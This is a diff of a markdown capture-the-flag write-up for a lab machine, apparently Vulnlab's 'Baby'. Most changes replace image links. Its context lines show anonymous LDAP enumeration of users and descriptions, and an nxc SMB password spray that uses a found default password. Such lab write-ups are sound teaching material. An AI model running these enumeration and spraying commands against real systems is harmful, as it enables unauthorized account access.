@@ -7,14 +7,8 @@ tags: [ldap, anonymous, SeBackupPrivilege, smbpasswd]
 image: "https://images-ext-1.discordapp.net/external/iTsNgpEcu1U88J1FvpyBi4VwhZZRBo0W6Rd5ARdznbE/https/assets.vulnlab.com/baby_slide.png?format=webp&quality=lossless"
 ---
 
-![image.png](attachment:8b12474b-0c0d-42a6-bc13-c9268b7a718e:image.png)
+![image.png](https://www.notion.so/image/attachment%3Aa03294c9-05f1-41a8-8020-c8038e84c4f4%3Aimage.png?table=block&id=1d43d2c4-89f6-80eb-bd47-d915caa3f7e7&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)
 
-<aside>
-💡
-
-10.10.116.106
-
-</aside>
 
 ## Scanning
 
@@ -93,7 +87,7 @@ ldapsearch -x -H ldap://10.10.116.106 -b "DC=baby,DC=vl"
 ldapsearch -x -H ldap://10.10.116.106 -b "DC=baby,DC=vl" -D 'baby.vl' 'objectClass=user' | grep "sAMAccountName:" | cut -d' ' -f2 | tee loots/users.txt
 ```
 
-![image.png](attachment:a03294c9-05f1-41a8-8020-c8038e84c4f4:image.png)
+![image.png](https://www.notion.so/image/attachment%3Aa03294c9-05f1-41a8-8020-c8038e84c4f4%3Aimage.png?table=block&id=1d43d2c4-89f6-80eb-bd47-d915caa3f7e7&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)
 
 Descriptions
 
@@ -101,7 +95,7 @@ Descriptions
 ldapsearch -x -H ldap://10.10.116.106 -b "DC=baby,DC=vl" -D 'baby.vl' 'objectClass=user' | grep "description:"
 ```
 
-![image.png](attachment:018b74bd-511a-4fd8-8ec7-4f1f4d8095e8:image.png)
+![image.png](https://www.notion.so/image/attachment%3A018b74bd-511a-4fd8-8ec7-4f1f4d8095e8%3Aimage.png?table=block&id=1d43d2c4-89f6-8001-bec2-db7e456dd308&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)
 
 ### SMB
 
@@ -109,7 +103,7 @@ ldapsearch -x -H ldap://10.10.116.106 -b "DC=baby,DC=vl" -D 'baby.vl' 'objectCla
 nxc smb 10.10.116.106 -u loots/users.txt -p 'BabyStart123!' --continue-on-success
 ```
 
-![image.png](attachment:8128a076-a6bb-4f80-9bb2-dc3ad0369069:image.png)
+![image.png](https://www.notion.so/image/attachment%3A8128a076-a6bb-4f80-9bb2-dc3ad0369069%3Aimage.png?table=block&id=1d43d2c4-89f6-80df-96ae-c13d0b80c19d&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)
 
 Password Change
 
